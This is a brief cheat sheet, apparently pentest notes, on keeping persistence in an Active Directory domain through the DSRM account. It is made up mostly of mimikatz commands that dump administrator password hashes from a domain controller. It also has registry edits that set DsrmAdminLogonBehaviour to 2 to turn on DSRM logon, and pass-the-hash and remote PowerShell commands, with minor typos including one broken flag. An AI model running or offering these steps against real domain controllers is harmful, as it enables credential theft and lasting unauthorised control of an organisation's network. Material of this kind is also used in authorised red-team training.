# Domain Persistance - DSRM

Directory Service Restore Mode (DSRM) , every `Local Administrator` on Domain Controller `DC` is named `Administrator` account , this Administrator is called DSRM account and DSRM password is set when a DC is promoted.

So it is possible to perfrom `Pass The Hash` attack after extracting NTLM hash of Local Administrator account , local administrator password is just a backup password if something goes wrong ,usually local administrator isn't used by DC

## Using mimikatz.exe
```
privilege:debug (to see privileges)
token::elevate  (to become NT AUTHORITY\SYSTEM)
```

### Extracting Local Administrator password hash
```
lsadump::sam
```

### Extracting Domain Administrator password hash

```
lsadump::lsa /patch
```

By default DSRM logon is disbaled , value is set to 0 , set the value to 2

```
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -Verbos
```

if this entry doesn't exist , we can create it 

```
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -PropertyType DWORD -Verbose
```

Then 

```
sekurlsa::pth /user:Administrator /domain:dominname /ntlm:ntlm_hash_of_local_admin
```

## Using mimikatz powershell

This is for local administrator

```
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam""' -Computername computername 
```

This is for domain admin

```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername computername
```

now performing pass the hash

```
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:domainname /user:Administrator /ntlm:local_admin_hash /run:powershell.exe"'
```


```
Enter-PSsession -Computername computer
```